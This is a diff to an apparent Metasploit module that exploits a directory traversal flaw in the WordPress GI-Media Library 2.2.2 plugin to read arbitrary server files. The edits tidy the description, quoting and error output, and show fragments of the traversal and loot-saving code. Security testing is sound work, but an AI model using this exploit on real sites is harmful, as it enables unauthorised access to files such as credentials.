@@ -16,8 +16,9 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'WordPress GI-Media Library Plugin File Read Vulnerability',
       'Description'    => %q{
         This module exploits a directory traversal vulnerability in WordPress Plugin
-        "GI-Media Library" version 2.2.2, allowing to read arbitrary files on
-        Wordpress directory.
+        GI-Media Library version 2.2.2, allowing to read arbitrary files from the
+        system with the web server privileges. This module has been tested successfully
+        on GI-Media Library version 2.2.2 with WordPress 4.1.3 on Ubuntu 12.04 Server.
       },
       'References'     =>
         [
@@ -44,7 +45,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    traversal = "../" * datastore['DEPTH']
+    traversal = '../' * datastore['DEPTH']
     filename = datastore['FILEPATH']
     filename = filename[1, filename.length] if filename =~ /^\//
 
@@ -58,10 +59,6 @@ class Metasploit3 < Msf::Auxiliary
     )
 
     if res && res.code == 200 && res.body && res.body.length > 0
-
-      print_status('Downloading file...')
-      print_line("\n#{res.body}")
-
       fname = datastore['FILEPATH']
 
       path = store_loot(
@@ -74,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
 
       print_good("#{peer} - File saved in: #{path}")
     else
-      print_error("#{peer} - Nothing was downloaded. Check the correct path wordpress files.")
+      vprint_error("#{peer} - Nothing was downloaded. Check the correct path wordpress files.")
     end
   end
 end
